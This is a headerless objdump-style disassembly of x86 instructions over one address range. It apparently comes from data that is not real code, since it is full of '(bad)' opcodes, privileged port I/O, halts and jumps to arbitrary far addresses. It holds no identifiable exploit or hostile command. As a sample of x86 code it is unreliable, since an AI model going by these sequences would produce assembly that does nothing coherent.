  41c8f9:	push   ebx
  41c8fa:	test   DWORD PTR ds:0xfd6e54b0,esi
  41c900:	in     al,0x84
  41c902:	out    0x7f,al
  41c904:	cs mov ebp,ss
  41c907:	(bad)  
  41c908:	stc    
  41c909:	popf   
  41c90a:	rol    DWORD PTR [ecx-0x3e],cl
  41c90d:	js     0x41c8b3
  41c90f:	and    ebp,edx
  41c911:	jmp    0x9ed2234a
  41c916:	gs sub ch,0xd8
  41c91a:	xor    eax,0xa22b5ba2
  41c91f:	inc    ecx
  41c920:	cmp    ch,bl
  41c922:	push   0xffffff9e
  41c924:	add    ch,0x43
  41c927:	addr16 ss jle 0x41c8d3
  41c92b:	mov    ch,0xe
  41c92d:	cmp    DWORD PTR [ecx-0xd],0x68
  41c931:	or     eax,0xfc407752
  41c936:	cdq    
  41c937:	sbb    ebp,DWORD PTR [edi-0x43]
  41c93a:	jecxz  0x41c917
  41c93c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c93d:	mov    edx,DWORD PTR [edx]
  41c93f:	pusha  
  41c940:	dec    eax
  41c941:	rcl    DWORD PTR [ebx+0x3b],0x9a
  41c945:	mov    edi,DWORD PTR [esi]
  41c947:	xor    BYTE PTR [esi],ch
  41c949:	loopne 0x41c8fd
  41c94b:	das    
  41c94c:	adc    bh,ch
  41c94e:	cmp    ah,dh
  41c950:	mov    dh,0x9d
  41c952:	xor    BYTE PTR [ecx-0x4da17708],ah
  41c958:	sub    DWORD PTR [esi+0x50915c15],esi
  41c95e:	fwait
  41c95f:	int3   
  41c960:	dec    ebp
  41c961:	popf   
  41c962:	lds    edi,FWORD PTR [ebp-0x34caa26c]
  41c968:	mul    DWORD PTR [edx-0x669d6210]
  41c96e:	inc    esp
  41c96f:	mov    ?,esi
  41c971:	mov    bl,0xd2
  41c973:	push   edx
  41c974:	sbb    dh,BYTE PTR [ebp+edx*1+0x5d630976]
  41c97b:	or     ch,cl
  41c97d:	fsubr  st(2),st
  41c97f:	imul   eax,DWORD PTR [esi],0x2e
  41c982:	sub    al,0xfb
  41c984:	jle    0x41c9c2
  41c986:	mov    eax,ds:0xef0a0fb6
  41c98b:	aam    0xe4
  41c98d:	pop    ss
  41c98e:	add    DWORD PTR [esi-0x460a6156],0xffffffd1
  41c995:	mov    DWORD PTR [ecx+0xd],ebx
  41c998:	mov    ?,WORD PTR [edi-0x185c0a93]
  41c99e:	mov    esp,0x1dda9a1b
  41c9a3:	outs   dx,DWORD PTR ds:[esi]
  41c9a4:	sbb    al,0xf4
  41c9a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a7:	lahf   
  41c9a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a9:	fild   DWORD PTR [esi+eax*1-0x4c45ffa0]
  41c9b0:	pop    esi
  41c9b1:	test   eax,0xc3fdaeec
  41c9b6:	dec    esi
  41c9b7:	rcl    BYTE PTR [edx-0x188040bd],cl
  41c9bd:	inc    eax
  41c9be:	cli    
  41c9bf:	push   esp
  41c9c0:	jp     0x41ca23
  41c9c2:	mov    WORD PTR gs:[ecx-0x2f0df266],ss
  41c9c9:	mov    dl,0x5f
  41c9cb:	in     al,dx
  41c9cc:	and    eax,0x9d1cda59
  41c9d1:	mov    BYTE PTR [ebp+ebx*4+0x44],0x33
  41c9d6:	sub    DWORD PTR [edi+edx*8],ebx
  41c9d9:	mov    ds:0xba0a6289,al
  41c9de:	jne    0x41ca5f
  41c9e0:	mov    dh,0xdd
  41c9e2:	push   0x61074be7
  41c9e7:	ficomp WORD PTR [ebx+edi*2-0x39]
  41c9eb:	cmp    BYTE PTR [eax+0x9],ah
  41c9ee:	test   DWORD PTR [edi],ebx
  41c9f0:	ja     0x41ca51
  41c9f2:	bound  eax,QWORD PTR [eax-0x70]
  41c9f5:	xlat   BYTE PTR ds:[ebx]
  41c9f6:	sbb    eax,DWORD PTR [esi]
  41c9f8:	pop    es
  41c9f9:	sbb    cl,BYTE PTR [eax]
  41c9fb:	cmp    ecx,0xffffffa7
  41c9fe:	dec    eax
  41c9ff:	inc    edx
  41ca00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca01:	sbb    DWORD PTR [eax-0x29],ecx
  41ca04:	sub    eax,0x6921d026
  41ca09:	imul   esi,DWORD PTR [ecx+0x55cd592e],0x5e
  41ca10:	int3   
  41ca11:	dec    esi
  41ca12:	inc    ebp
  41ca13:	pop    esi
  41ca14:	jns    0x41ca14
  41ca16:	or     bh,BYTE PTR [ecx+0x37]
  41ca19:	idiv   DWORD PTR [esi]
  41ca1b:	mov    cl,0x39
  41ca1d:	ins    BYTE PTR es:[edi],dx
  41ca1e:	pop    esi
  41ca1f:	adc    dl,bl
  41ca21:	inc    edi
  41ca22:	div    BYTE PTR [esi+0x28]
  41ca25:	xor    eax,0x985467fe
  41ca2a:	rol    BYTE PTR [ecx+0xc],0xc6
  41ca2e:	jmp    0x1c54d9a3
  41ca33:	sti    
  41ca34:	mov    al,ds:0x7d0307c3
  41ca39:	ror    ebp,1
  41ca3b:	adc    dl,BYTE PTR [ecx-0x51]
  41ca3e:	dec    ebx
  41ca3f:	push   0x38
  41ca41:	sub    BYTE PTR [esp+eax*1],ch
  41ca44:	and    BYTE PTR [ebx+0x2bd810a5],dh
  41ca4a:	cmp    al,0x18
  41ca4c:	fimul  WORD PTR [edi+0x71]
  41ca4f:	push   esp
  41ca50:	ins    BYTE PTR es:[edi],dx
  41ca51:	push   0xffffffaa
  41ca53:	mov    dl,BYTE PTR [edx-0x728258e9]
  41ca59:	and    al,ah
  41ca5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5c:	lea    ebx,[ecx+0x4a6223d3]
  41ca62:	scas   eax,DWORD PTR es:[edi]
  41ca63:	lods   eax,DWORD PTR ds:[esi]
  41ca64:	ja     0x41cac8
  41ca66:	mov    al,ds:0x9deebf37
  41ca6b:	dec    esi
  41ca6c:	dec    eax
  41ca6d:	jg     0x41ca1b
  41ca6f:	aaa    
  41ca70:	push   edi
  41ca71:	(bad)  
  41ca72:	pop    ebp
  41ca73:	push   edi
  41ca74:	xchg   ecx,eax
  41ca75:	ror    DWORD PTR [ebp-0x47a7ee2d],cl
  41ca7b:	or     dl,BYTE PTR [edi]
  41ca7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca7e:	cwde   
  41ca7f:	(bad)  
  41ca80:	mov    ch,0xe2
  41ca82:	xchg   esi,eax
  41ca83:	mov    ebx,DWORD PTR [eax+0x682f4c4e]
  41ca89:	jno    0x41ca45
  41ca8b:	mov    ds:0x8930c12,eax
  41ca90:	rol    al,cl
  41ca92:	mov    cl,bl
  41ca94:	xor    DWORD PTR [esi],eax
  41ca96:	cld    
  41ca97:	mov    bl,0x40
  41ca99:	hlt    
  41ca9a:	fxtract 
  41ca9c:	pop    es
  41ca9d:	push   edx
  41ca9e:	jbe    0x41cab8
  41caa0:	lods   eax,DWORD PTR ds:[esi]
  41caa1:	cmp    BYTE PTR [eax+0x1feef75f],bl
  41caa7:	pop    ebx
  41caa8:	mov    BYTE PTR [edx+0x275218fd],cl
  41caae:	jmp    0xa4e:0xc7359dd8
  41cab5:	mov    al,ds:0xa81e840
  41caba:	adc    dh,BYTE PTR [ebp-0x4e]
  41cabd:	sbb    BYTE PTR [ecx],ch
  41cabf:	out    dx,al
  41cac0:	stos   DWORD PTR es:[edi],eax
  41cac1:	inc    edx
  41cac2:	ror    BYTE PTR [ecx],0x41
  41cac5:	adc    al,0x36
  41cac7:	fcmovnbe st,st(6)
  41cac9:	inc    esi
  41caca:	lahf   
  41cacb:	lea    ebp,[ecx-0x75f2efa7]
  41cad1:	adc    DWORD PTR [ebp-0x65c3dd99],0xb0716111
  41cadb:	or     eax,DWORD PTR [eax+0x37e2cd1e]
  41cae1:	jno    0x41cb35
  41cae3:	inc    edi
  41cae4:	mov    ebx,0x29ffd770
  41cae9:	pop    edx
  41caea:	mov    al,ds:0x8b36442d
  41caef:	(bad)
  41caf2:	inc    edi
  41caf3:	test   eax,0xd84e6972
  41caf8:	pop    ss
  41caf9:	shr    esp,1
  41cafb:	xor    DWORD PTR [ecx+eax*2],ebx
  41cafe:	sahf   
  41caff:	inc    esp
  41cb00:	int    0x17
  41cb02:	inc    edi
  41cb03:	sub    dh,BYTE PTR [ebp+ebp*2-0x77]
  41cb07:	mov    gs,edi
  41cb09:	pop    eax
  41cb0a:	push   0x5c
  41cb0c:	sbb    eax,0xef1d38fb
  41cb11:	test   DWORD PTR [edi+0x48700f77],eax
  41cb17:	mov    esi,0x817f83e1
  41cb1c:	loopne 0x41cb0d
  41cb1e:	jecxz  0x41cb03
  41cb20:	fadd   DWORD PTR [ebx-0x4eae6514]
  41cb26:	jb     0x41cacf
  41cb28:	inc    eax
  41cb29:	test   ch,ch
  41cb2b:	mov    ah,0xcf
  41cb2d:	std    
  41cb2e:	or     esi,esp
  41cb30:	repz retf 
  41cb32:	push   eax
  41cb33:	rol    DWORD PTR [ebx],1
  41cb35:	(bad)  
  41cb36:	cdq    
  41cb37:	scas   eax,DWORD PTR es:[edi]
  41cb38:	in     eax,0x21
  41cb3a:	les    edx,FWORD PTR [edx+0x1e29e1b1]
  41cb40:	imul   esp,DWORD PTR [ecx+0x33],0x3bf48508
  41cb47:	enter  0xf5c9,0xca
  41cb4b:	ja     0x41cbc7
  41cb4d:	or     al,0xac
  41cb4f:	push   0x2f
  41cb51:	add    esp,DWORD PTR [edi+0x7756a336]
  41cb57:	cmp    ebx,DWORD PTR [ecx-0x49]
  41cb5a:	mov    ecx,0xe7f45184
  41cb5f:	out    0x7,al
  41cb61:	pop    es
  41cb62:	stos   BYTE PTR es:[edi],al
  41cb63:	cmp    eax,0x74b49879
  41cb68:	popf   
  41cb69:	push   esi
  41cb6a:	inc    ecx
  41cb6b:	cmp    BYTE PTR [edx],cl
  41cb6d:	fdiv   st(7),st
  41cb6f:	or     al,0xa7
  41cb71:	adc    DWORD PTR [esi-0x23f2f585],esp
  41cb77:	jg     0x41cbb7
  41cb79:	mov    dh,0xd3
  41cb7b:	ret    
  41cb7c:	jo     0x41cb28
  41cb7e:	xor    eax,0x782b4782
  41cb83:	inc    esp
  41cb84:	sbb    eax,0xc3dc3d17
  41cb89:	jl     0x41cbb5
  41cb8b:	pop    edi
  41cb8c:	rcr    eax,cl
  41cb8e:	inc    ebp
  41cb8f:	(bad)  
  41cb91:	mov    bh,0x4e
  41cb93:	mov    es,WORD PTR [esi+0xc112ece]
  41cb99:	popa   
  41cb9a:	sbb    esi,DWORD PTR [edx+0x3d]
  41cb9d:	or     DWORD PTR [ebp+0x195d8618],0x62
  41cba4:	shl    DWORD PTR [esp+ecx*8+0x33b122c2],cl
  41cbab:	icebp  
  41cbac:	aam    0x2b
  41cbae:	push   ss
  41cbaf:	inc    eax
  41cbb0:	xor    al,0x82
  41cbb2:	cmp    BYTE PTR [ebx+0x2ca80b5a],cl
  41cbb8:	dec    esi
  41cbb9:	call   0xb976:0x461e4d58
  41cbc0:	cmp    DWORD PTR ds:0x4b412491,ebx
  41cbc6:	cmp    eax,edx
  41cbc8:	gs pop ss
  41cbca:	loop   0x41cbd2
  41cbcc:	lock mov eax,ds:0x13af7e25
  41cbd2:	sbb    al,0xdc
  41cbd4:	fs das 
  41cbd6:	xchg   ebx,eax
  41cbd7:	xchg   BYTE PTR [esi-0x765ec1d1],bl
  41cbdd:	and    BYTE PTR [ebp-0x38],bl
  41cbe0:	cld    
  41cbe1:	lea    esi,[esi+eax*4]
  41cbe4:	sbb    edi,DWORD PTR [ecx+0x3d]
  41cbe7:	repz push cs
  41cbe9:	jo     0x41cc49
  41cbeb:	sub    bl,BYTE PTR [esi+0x7d]
  41cbee:	(bad)  
  41cbef:	jno    0x41cbe9
  41cbf1:	or     ch,cl
  41cbf3:	push   edi
  41cbf4:	or     eax,0x8eaf9b38
  41cbf9:	lahf   
  41cbfa:	pop    esi
  41cbfb:	xchg   DWORD PTR [ecx+0x55b876ea],edi
  41cc01:	sub    BYTE PTR [esi-0x44701995],bl
  41cc07:	or     esp,DWORD PTR [eax+0x57060ebb]
  41cc0d:	int3   
  41cc0e:	jmp    0x21f47d77
  41cc13:	push   ecx
  41cc14:	inc    esi
  41cc15:	test   DWORD PTR [eax],ecx
  41cc17:	pop    ds
  41cc18:	jmp    0x41cbad
  41cc1a:	loopne 0x41cc4c
  41cc1c:	adc    BYTE PTR [edx-0x44559cfc],0x9f
  41cc23:	ret    
  41cc24:	mov    ds:0x9a89d473,al
  41cc29:	mov    edi,?
  41cc2b:	inc    ecx
  41cc2c:	lds    ecx,FWORD PTR [eax+0x2e]
  41cc2f:	(bad)  
  41cc30:	imul   DWORD PTR [edi-0x1b22ab5d]
  41cc36:	shl    DWORD PTR [ebx+edx*1+0x8f1d780],0xf2
  41cc3e:	cmp    al,0x1c
  41cc40:	jl     0x41cc0a
  41cc42:	fadd   QWORD PTR [edx+0x16e5d64a]
  41cc48:	cwde   
  41cc49:	push   0x577a1e57
  41cc4e:	sbb    BYTE PTR [ebp+eax*8+0x17],0xd9
  41cc53:	and    DWORD PTR [ebx],edx
  41cc55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc56:	aaa    
  41cc57:	jmp    0x41cc68
  41cc59:	int3   
  41cc5a:	xchg   ecx,eax
  41cc5b:	ret    
  41cc5c:	ds in  eax,dx
  41cc5e:	push   edi
  41cc5f:	add    eax,0x1cc8b35f
  41cc64:	jne    0x41cc9a
  41cc66:	in     al,0x7f
  41cc68:	fcom   DWORD PTR [ebp-0x27]
  41cc6b:	or     al,0xdf
  41cc6d:	iret   
  41cc6e:	(bad)  [esi+0x3cece624]
  41cc74:	fisub  WORD PTR [ebp+0x48043e43]
  41cc7a:	loopne 0x41cc7c
  41cc7c:	dec    eax
  41cc7d:	jo     0x41cc2d
  41cc7f:	add    DWORD PTR [ebx-0x59adcdc7],esp
  41cc85:	pusha  
  41cc86:	mov    dh,BYTE PTR [ecx-0xa]
  41cc89:	cvtdq2ps xmm2,XMMWORD PTR [edx]
  41cc8c:	and    edx,DWORD PTR [edx-0x71]
  41cc8f:	inc    eax
  41cc90:	add    DWORD PTR [eax+0x5116bf80],0xffffffa8
  41cc97:	push   eax
  41cc98:	mov    ds:0x69793768,eax
  41cc9d:	scas   eax,DWORD PTR es:[edi]
  41cc9e:	divps  xmm6,XMMWORD PTR [esi]
  41cca1:	test   eax,0x49555e39
  41cca6:	out    0x5d,al
  41cca8:	outs   dx,DWORD PTR ds:[esi]
  41cca9:	in     al,dx
  41ccaa:	aaa    
  41ccab:	retf   
  41ccac:	mov    bl,0x27
  41ccae:	aad    0x10
  41ccb0:	jns    0x41cce5
  41ccb2:	jo     0x41cccf
  41ccb4:	pusha  
  41ccb5:	pop    ds
  41ccb6:	jne    0x41ccea
  41ccb8:	fldcw  WORD PTR [ebp+0x345eecb9]
  41ccbe:	or     cl,BYTE PTR [eax+0x7f]
  41ccc1:	jp     0x41cc54
  41ccc3:	stc    
  41ccc4:	sbb    dl,BYTE PTR [eax]
  41ccc6:	adc    BYTE PTR [edi+0x59741c6e],dh
  41cccc:	ror    BYTE PTR [edi+0x7a],0xe5
  41ccd0:	xchg   ebx,eax
  41ccd1:	sbb    BYTE PTR [esi-0x6d],dh
  41ccd4:	bound  edx,QWORD PTR [edi-0x7224279a]
  41ccda:	imul   edx,DWORD PTR [ecx],0xffffffa9
  41ccdd:	imul   BYTE PTR [ecx-0x30f07de1]
  41cce3:	daa    
  41cce4:	mov    ah,0xa8
  41cce6:	sar    BYTE PTR [ecx+edi*1],1
  41cce9:	sub    al,0x9
  41cceb:	ror    eax,0x75
  41ccee:	jnp    0x41cd49
  41ccf0:	ficom  WORD PTR ds:0x22cc2ea9
  41ccf6:	sbb    BYTE PTR [ebp+0x798b0fe3],dl
  41ccfc:	out    0xed,al
  41ccfe:	and    eax,DWORD PTR ds:0xdf03e345
  41cd04:	xor    eax,DWORD PTR [edi+0x3f]
  41cd07:	push   edx
  41cd08:	(bad)  
  41cd09:	es imul ecx,edx,0x3b7f97f3
  41cd10:	adc    BYTE PTR [edx-0x7451f77],dl
  41cd16:	mov    eax,ds:0x9e13e02c
  41cd1b:	stos   DWORD PTR es:[edi],eax
  41cd1c:	push   ebp
  41cd1d:	xlat   BYTE PTR ds:[ebx]
  41cd1e:	sub    ah,BYTE PTR [eax]
  41cd20:	cmp    edi,0x99b32424
  41cd26:	add    al,0x5
  41cd28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd29:	mul    esp
  41cd2b:	inc    ecx
  41cd2c:	scas   eax,DWORD PTR es:[edi]
  41cd2d:	imul   esi,DWORD PTR [edi-0x9],0xcb5d212d
  41cd34:	sbb    bh,BYTE PTR [ebx+0x3f]
  41cd37:	sub    dh,BYTE PTR [edi]
  41cd39:	xchg   esp,eax
  41cd3a:	cmp    esi,DWORD PTR ds:0x3e82f0c4
  41cd40:	mov    WORD PTR [eax+0x19],cs
  41cd43:	jnp    0x41cdbb
  41cd45:	outs   dx,DWORD PTR ds:[esi]
  41cd46:	(bad)  
  41cd47:	pushf  
  41cd48:	or     esp,DWORD PTR [ecx+0x1df4de77]
  41cd4e:	(bad)  
  41cd50:	retf   0xcd1b
  41cd53:	inc    esi
  41cd54:	call   ebx
  41cd56:	cmp    cl,al
  41cd58:	ficomp DWORD PTR [ebx-0x54]
  41cd5b:	jb     0x41cd0a
  41cd5d:	dec    ebp
  41cd5e:	outs   dx,DWORD PTR ds:[esi]
  41cd5f:	outs   dx,BYTE PTR ds:[esi]
  41cd60:	mov    ebp,0xdebbe3e2
  41cd65:	jl     0x41cd4f
  41cd67:	adc    al,0xd8
  41cd69:	test   eax,0x43d70661
  41cd6e:	mov    al,ds:0xa6ba5431
  41cd73:	sub    dl,dh
  41cd75:	mov    ah,0x2b
  41cd77:	push   0xffffffe9
  41cd79:	cmc    
  41cd7a:	inc    esi
  41cd7b:	xchg   DWORD PTR [eax+0x30],edi
  41cd7e:	add    al,0xaf
  41cd80:	sar    eax,1
  41cd82:	dec    ebp
  41cd83:	mov    BYTE PTR [eax+0x9fadac3],0x63
  41cd8a:	mov    ah,0x15
  41cd8c:	scas   eax,DWORD PTR es:[edi]
  41cd8d:	clc    
  41cd8e:	pop    eax
  41cd8f:	adc    BYTE PTR [edi],dh
  41cd91:	inc    ebp
  41cd92:	cs or  ecx,0x5
  41cd96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd97:	jl     0x41cdd7
  41cd99:	mov    edi,0x6ae67d95
  41cd9e:	push   es
  41cd9f:	scas   eax,DWORD PTR es:[edi]
  41cda0:	div    BYTE PTR [ecx]
  41cda2:	jle    0x41cdff
  41cda4:	mov    ebx,0xefd8677c
  41cda9:	push   esp
  41cdaa:	cdq    
  41cdab:	addr16 shl esi,cl
  41cdae:	out    dx,al
  41cdaf:	pop    esi
  41cdb0:	cwde   
  41cdb1:	aas    
  41cdb2:	sbb    al,0xd0
  41cdb4:	sbb    BYTE PTR [esi+0x1c81f031],bl
  41cdba:	ins    DWORD PTR es:[edi],dx
  41cdbb:	jle    0x41cd46
  41cdbd:	cmp    edi,DWORD PTR [ebx-0x32e380]
  41cdc3:	(bad)  
  41cdc4:	aas    
  41cdc5:	and    al,0x7e
  41cdc7:	imul   eax,DWORD PTR [ebp-0xf],0x2d
  41cdcb:	pop    edx
  41cdcc:	adc    ah,bl
  41cdce:	das    
  41cdcf:	dec    eax
  41cdd0:	loopne 0x41cde3
  41cdd2:	xlat   BYTE PTR ds:[ebx]
  41cdd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdd4:	mov    ebp,esp
  41cdd6:	pop    esi
  41cdd7:	lods   eax,DWORD PTR ds:[esi]
  41cdd8:	sbb    DWORD PTR [esi-0xa],edi
  41cddb:	xchg   edi,eax
  41cddc:	push   esp
  41cddd:	les    edx,FWORD PTR [eax-0x32]
  41cde0:	sub    bl,dl
  41cde2:	sbb    BYTE PTR [edx+0x6],bh
  41cde5:	fwait
  41cde6:	test   eax,0xd32b5ad2
  41cdeb:	aas    
  41cdec:	test   DWORD PTR [edx+0x1cc1ce53],edx
  41cdf2:	adc    al,0x60
  41cdf4:	push   edi
  41cdf5:	loop   0x41ce34
  41cdf7:	aaa    
  41cdf8:	sar    dl,0x77
  41cdfb:	hlt    
  41cdfc:	enter  0x771e,0xf1
  41ce00:	addr16 xor edx,eax
  41ce03:	fistp  QWORD PTR [esi+ecx*8]
  41ce06:	push   cs
  41ce07:	(bad)  
  41ce08:	lock push 0x5e
  41ce0b:	cli    
  41ce0c:	mov    edi,0x792b3396
  41ce11:	in     eax,dx
  41ce12:	fwait
  41ce13:	inc    edx
  41ce14:	inc    esp
  41ce15:	inc    edi
  41ce16:	xchg   ecx,eax
  41ce17:	add    al,0x2b
  41ce19:	int3   
  41ce1a:	stos   DWORD PTR es:[edi],eax
  41ce1b:	pusha  
  41ce1c:	xchg   BYTE PTR [eax+0x5e],bl
  41ce1f:	icebp  
  41ce20:	push   ebx
  41ce21:	mov    eax,esi
  41ce23:	mov    edx,0x79141572
  41ce28:	cld    
  41ce29:	repz cmp BYTE PTR [ecx+0x50],dl
  41ce2d:	inc    esp
  41ce2e:	pop    ss
  41ce2f:	das    
  41ce30:	mov    ds,WORD PTR [edi-0x4a]
  41ce33:	mov    bl,BYTE PTR [ecx-0x5154f44f]
  41ce39:	(bad)  
  41ce3a:	adc    DWORD PTR [ecx-0x18a4a0e2],eax
  41ce40:	jmp    0x41ce04
  41ce42:	sar    DWORD PTR [ebx],cl
  41ce44:	stc    
  41ce45:	into   
  41ce46:	not    BYTE PTR [ebp-0x74]
  41ce49:	push   es
  41ce4a:	or     al,0x1a
  41ce4c:	in     al,0xb3
  41ce4e:	shr    DWORD PTR [ebx-0x4a51606d],1
  41ce54:	cs in  al,dx
  41ce56:	xchg   WORD PTR [ebx+0x54adaac8],dx
  41ce5d:	mov    ds:0xbbe983f6,eax
  41ce62:	jbe    0x41cdfc
  41ce64:	add    ecx,esp
  41ce66:	mov    esp,0x2a88ac07
  41ce6b:	pop    ebp
  41ce6c:	mov    bl,bl
  41ce6e:	push   ecx
  41ce6f:	test   DWORD PTR [esi-0x2e],0x302958c
  41ce76:	lock cmp cl,BYTE PTR cs:[edi]
  41ce7a:	dec    edx
  41ce7b:	add    cl,BYTE PTR [edi]
  41ce7d:	mov    ah,0x66
  41ce7f:	jno    0x41ce4b
  41ce81:	pop    edx
  41ce82:	dec    esi
  41ce83:	jne    0x41cebf
  41ce85:	sbb    eax,0xf6bd8879
  41ce8a:	mov    bh,0x9
  41ce8c:	(bad)  
  41ce8e:	inc    esi
  41ce8f:	(bad)  
  41ce90:	loope  0x41cf0d
  41ce92:	loope  0x41ce1a
  41ce94:	push   ss
  41ce95:	mov    al,ds:0x2cdf77e5
  41ce9a:	mov    BYTE PTR [edi+0x6d],bh
  41ce9d:	outs   dx,BYTE PTR ds:[esi]
  41ce9e:	mov    BYTE PTR [ebx+0x22e7c363],cl
  41cea4:	mov    DWORD PTR [edi+0x72],0xdf75c3ea
  41ceab:	aas    
  41ceac:	enter  0x4ae0,0xd
  41ceb0:	inc    esp
  41ceb1:	mov    eax,0xcf35fd07
  41ceb6:	lods   eax,DWORD PTR ds:[esi]
  41ceb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceb8:	(bad)
  41cebc:	sub    al,0xcd
  41cebe:	mov    dh,0xaf
  41cec0:	lods   al,BYTE PTR ds:[esi]
  41cec1:	sub    al,0x30
  41cec3:	out    0x65,al
  41cec5:	and    ebx,ecx
  41cec7:	dec    edi
  41cec8:	enter  0xf347,0xbb
  41cecc:	nop
  41cecd:	xor    al,0xd3
  41cecf:	shl    bl,cl
  41ced1:	cmp    al,0x55
  41ced3:	or     al,0x0
  41ced5:	pxor   mm0,QWORD PTR [ebx+0xb]
  41ced9:	push   eax
  41ceda:	les    ecx,FWORD PTR [ebx+edx*2]
  41cedd:	mov    gs,edx
  41cedf:	and    DWORD PTR [edx],0x5b
  41cee2:	clc    
  41cee3:	mov    dl,0xe2
  41cee5:	adc    al,0xeb
  41cee7:	xchg   ecx,eax
  41cee8:	icebp  
  41cee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceea:	call   0x7b7c6d81
  41ceef:	add    al,0x77
  41cef1:	cmp    al,0x21
  41cef3:	pop    ss
  41cef4:	test   DWORD PTR [edx],eax
  41cef6:	mov    dl,0x8c
  41cef8:	xchg   edi,eax
  41cef9:	lods   eax,DWORD PTR ds:[esi]
  41cefa:	mov    esp,0x2a5c28a1
  41ceff:	std    
  41cf00:	out    dx,al
  41cf01:	sub    ecx,edx
  41cf03:	sar    BYTE PTR [esi],1
  41cf05:	neg    DWORD PTR ds:0xa3c0f433
  41cf0b:	inc    BYTE PTR [ecx+0x664762e7]
  41cf11:	sub    cl,bh
  41cf13:	pop    ss
  41cf14:	add    DWORD PTR [esi-0xd],edi
  41cf17:	mov    esi,0x72643e20
  41cf1c:	nop
  41cf1d:	inc    edi
  41cf1e:	lods   eax,DWORD PTR ds:[esi]
  41cf1f:	jne    0x41cedb
  41cf21:	adc    al,0xb
  41cf23:	not    DWORD PTR [eax+0x48]
  41cf26:	loopne 0x41cf9b
  41cf28:	mov    dl,0x88
  41cf2a:	cmp    DWORD PTR [ebp+edi*8-0x32],esp
  41cf2e:	lods   al,BYTE PTR ds:[esi]
  41cf2f:	mov    eax,ds:0x3f3e0800
  41cf34:	loope  0x41cf83
  41cf36:	jne    0x41cf6c
  41cf38:	mov    ebx,0x34b267c2
  41cf3d:	adc    al,0xba
  41cf3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf40:	cmp    BYTE PTR [eax-0x3b81fe9e],0x53
  41cf47:	shr    DWORD PTR ds:0x774559d8,1
  41cf4d:	outs   dx,DWORD PTR ds:[esi]
  41cf4e:	or     dh,BYTE PTR [ecx+0x88ad782]
  41cf54:	fwait
  41cf55:	pop    esi
  41cf56:	push   cs
  41cf57:	adc    ecx,ecx
  41cf59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf5a:	pop    edi
  41cf5b:	sub    ebx,DWORD PTR ds:[eax]
  41cf5e:	dec    ebp
  41cf5f:	push   ebx
  41cf60:	loope  0x41cf76
  41cf62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf63:	arpl   WORD PTR [ebp-0x5228986],di
  41cf69:	stos   DWORD PTR es:[edi],eax
  41cf6a:	pusha  
  41cf6b:	jp     0x41cf9f
  41cf6d:	imul   edx,DWORD PTR [ebx-0x3],0x14
  41cf71:	push   es
  41cf72:	jns    0x41cff3
  41cf74:	mov    bl,0x5e
  41cf76:	xchg   edi,eax
  41cf77:	ja     0x41cf84
  41cf79:	mov    edi,0x489b116b
  41cf7e:	mov    eax,0xf1f650cd
  41cf83:	xor    DWORD PTR [ebx+0x1e3d013c],ebp
  41cf89:	imul   ebx,esp,0x567d4cb9
  41cf8f:	or     al,0x8c
  41cf91:	xor    dh,bl
  41cf93:	jmp    0x788f9ba0
  41cf98:	push   es
  41cf99:	mov    eax,ds:0x9d384ade
  41cf9e:	xor    BYTE PTR [ebp-0x529042b7],dl
  41cfa4:	nop
  41cfa5:	out    0xdc,eax
  41cfa7:	jbe    0x41d025
  41cfa9:	ret    
  41cfaa:	cdq    
  41cfab:	pop    ebp
  41cfac:	inc    eax
  41cfad:	push   ds
  41cfae:	fidiv  DWORD PTR [edx+ebp*4+0x1af75d3f]
  41cfb5:	or     eax,0xfbf1c541
  41cfba:	(bad)  
  41cfbb:	(bad)  
  41cfbc:	mov    esp,0x8ac28e3d
  41cfc1:	add    al,0xc
  41cfc3:	xchg   ecx,eax
  41cfc4:	add    DWORD PTR [edi],edx
  41cfc6:	sub    al,0x5a
  41cfc8:	lock push esp
  41cfca:	and    DWORD PTR [edi],esp
  41cfcc:	jg     0x41cf8b
  41cfce:	pop    edi
  41cfcf:	add    al,0xda
  41cfd1:	test   al,0xbb
  41cfd3:	add    BYTE PTR [esi-0x1d9c7c55],dh
  41cfd9:	fisubr WORD PTR [eax-0x4e]
  41cfdc:	jns    0x41cfd4
  41cfde:	daa    
  41cfdf:	iret   
  41cfe0:	in     al,dx
  41cfe1:	(bad)  
  41cfe2:	ins    BYTE PTR es:[edi],dx
  41cfe3:	leave  
  41cfe4:	addr16 jb 0x41d02e
  41cfe7:	loope  0x41d059
  41cfe9:	das    
  41cfea:	adc    BYTE PTR [ebx],dl
  41cfec:	loop   0x41d005
  41cfee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfef:	loop   0x41d020
  41cff1:	lods   eax,DWORD PTR ds:[esi]
  41cff2:	mov    al,0x5f
  41cff4:	(bad)  
  41cff5:	ficom  WORD PTR [edx+eiz*1]
  41cff8:	jne    0x41d029
  41cffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cffb:	fwait
  41cffc:	or     BYTE PTR [edi],dh
  41cffe:	stos   BYTE PTR es:[edi],al
  41cfff:	mov    bl,BYTE PTR [ecx+ebx*2-0x7e]
  41d003:	adc    edx,DWORD PTR [ebx]
  41d005:	pop    ebp
  41d006:	ins    BYTE PTR es:[edi],dx
  41d007:	lock add al,0x67
  41d00a:	pop    ds
  41d00b:	scas   al,BYTE PTR es:[edi]
  41d00c:	add    eax,0xdfe427f8
  41d011:	ror    DWORD PTR [ecx+0x33f9d7b],cl
  41d017:	addr16 pushaw 
  41d01a:	cmp    esp,DWORD PTR [esi+0x3c]
